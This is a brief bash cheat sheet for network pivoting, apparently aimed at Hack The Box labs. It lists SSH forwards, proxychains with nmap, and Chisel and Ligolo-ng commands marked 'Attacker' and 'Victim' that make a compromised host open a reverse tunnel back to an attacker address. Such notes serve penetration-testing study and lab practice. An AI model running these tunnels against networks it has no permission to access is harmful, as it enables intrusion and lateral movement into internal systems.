
```bash
# SSH Tunneling
ssh -L 1080:internal:80 user@pivot        # Local forward
ssh -D 1080 user@pivot                     # SOCKS proxy
ssh -R 9001:127.0.0.1:9001 user@pivot     # Remote forward

# Proxychains
/etc/proxychains4.conf  # socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.10.x

# Chisel (më i përdoruri në HTB/Pro Labs)
./chisel server -p 8080 --reverse          # Attacker
./chisel client 10.10.14.x:8080 R:1080:socks  # Victim

# Ligolo-ng (standard modern)
./proxy -selfcert                           # Attacker  
./agent -connect 10.10.14.x:11601 -ignore-cert  # Victim
```